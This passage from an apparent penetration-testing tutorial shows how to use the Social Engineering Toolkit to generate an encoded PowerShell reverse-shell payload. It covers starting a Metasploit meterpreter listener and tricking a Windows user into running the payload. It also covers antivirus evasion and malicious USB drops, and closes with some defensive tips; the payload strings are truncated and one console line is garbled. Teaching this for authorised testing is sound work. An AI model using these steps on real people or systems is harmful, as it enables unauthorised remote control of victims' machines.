    # Social Engineering Toolkit: PowerShell Attacker Vector


    The Java based PowerShell attack is great, but what if the target is not running
    Java, or we could not trick them into visiting our SET page? Another Social Engineering
    attempt is to trick a user into running a file that we send them.


    So, let''s take a look at creating a PowerShell shellcode file and sending it
    to a target. If we can trick the target into running the shellcode, or run it
    itself, we get a remote connection to the box.


    In this section we use SET''s PowerShell Attacker Vector to create a PowerShell
    script that when run by a target system will connect back and create a remote
    shell to our Kali system. We will also set up SET to look for these incoming connections.


    - 1. Fire up SET and pick option number 1, "Social-Engineering Attacks".

    - 2. Select option 10, "PowerShell Attacker Vector".


    ![](img/ff9cd19afe449ae54278ee429e668a6f_129_0.png)


    - 3. Choose next number 1, "PowerShell Alphanumeric Shellcode Injector".

    - 4. Now just enter the IP address of the Kali system and what port you want to
    use for the-


    Finally SET asks if you want to create the listener service, when the victim runs
    the code, SET will be all set to accept the remote connection. Type "yes" at the
    prompt.


    ```

    # IP address for the listener: 192.168.1.226

    >powershell Enter the port for the reverse [443]

    # Preparing the payload for delivery, and injecting alphanumeric shell...

    # Generating x86-based payload...

    # Encoded to bypass execution restriction...

    # If you want the payload commands and attack, they are exported to /root/set/reports/

    # Do you want to start the listener now [yes/no]: : yes

    ```


    SET now creates the exploit code and if you chose to start the listener, kicks
    off the listener service in Metasploit and waits for an incoming connection:


    ```

    / Processing /root/set/reports/powershell.rc for ERB directives.

    resource(/root/set/reports/powershell.rc) use multi/handler

    resource(/root/set/reports/powershell.rc) set payload "windows/meterpreter/reverse_tcp"

    > use windows/meterpreter/reverse_tcp> set lport 443

    lport = 443

    resource(/root/set/reports/powershell.rc) set LHOST 0.0.0.0

    resource(/root/set/reports/powershell.rc) set exploit

    > exploit

    Establishing reverse handler on 0.0.0.0:443

    [*] session 1 opened (more you are to hear)

    ```


    Now we just need to get the exploit code to the victim system. SET creates the
    exploit code and places it into the "/root/set/reports/powershell/" directory.


    Leave the SET window open and open an additional terminal shell.


    Navigate to the powershell directory and you will see the powershell injection
    code in a text file, "x86_powershell_injection.txt" in our example.


    You can "cat" the file to display its contents:


    ```

    root@kali:~# cd /root/set/reports/powershell/

    root@kali:~# ls

    root@kali:~# cat /root/set/reports/powershell/x86_powershell_injection.txt

    powershell -nop windows -hidden -nonenc 

    ```


    If a Windows system runs the code, a remote session will open up to your Kali
    machine.


    ```

    # C:\Windows\System32\cmd.exe

    Microsoft Windows [Version 6.1.7601] All rights reserved.

    Copyright (c) 2009 Microsoft Corporation.

    C:\Users\Client>powershell -nop hidden -enc 

    ```


    Once you hit enter, a remote session is created on the Kali machine:


    ![](img/ff9cd19afe449ae54278ee429e668a6f_131_0.png)


    As in the previous tutorial, once a session is open we can use any Meterpreter
    or Linux command, or just type "shell" to get a remote command prompt.


    # ALTERNATIVE OPTIONS:


    Though most users will not copy and paste a text file to a command prompt and
    execute it, this works great for penetration testers who might be able to gain
    access to a remote command prompt and want to use a full Meterpreter shell.


    Also, there are several tutorials on the web explaining how to take the resultant
    SET PowerShell text file and convert it into an executable .exe file.


    Basically you turn the text file into a batch file, and then use a .bat to .exe
    converter to change the file into an executable.


    I leave this exercise up to the reader.


    Or you could simply use the program "Veil" (refer to the chapter on Bypassing
    AV with Veil) that does basically the same thing.


    # Conclusion


    PowerShell is available on almost every Windows box these days, and many anti-virus
    programs do not detect these types of attacks making them very powerful. As you
    can see below, I uploaded the PowerShell injection code to VirusTotal and it didn’t
    detect anything malicious:


    ![](img/ff9cd19afe449ae54278ee429e668a6f_132_0.png)


    Most likely, you would need to be tricked into running the code for the attack
    to be successful. As always, be very careful opening files and links from e-mails
    and social media messaging.


    Run an internet browser script program like the Firefox add-in, "NoScript" to
    prevent code from automatically running from visited websites.


    Also be very wary of shortened links, especially used on Twitter. Recently I saw
    a shortened link on Twitter that when unshrunk was a four line command to a malware
    server!


    # More Advanced Attacks with SET


    Spend some time with SET and check out the numerous options it offers for attacking
    a target system.


    You can use SET to create malicious CD/DVD and USB media (for creating malicious
    media and leaving them in corporate parking lots, etc), a slew of Arduino based
    attacks, Microsoft SQL Brute Forcer, Wireless Access Point attack, a Mass E-Mailer,
    QR code attack and a bunch of website social engineering attacks that we did not
    cover.


    The SCCM vector under the Fast Track menu is especially of concern to any corporation
    that uses PXE booting and corporate images. For a complete overview of the SCCM,
    see:


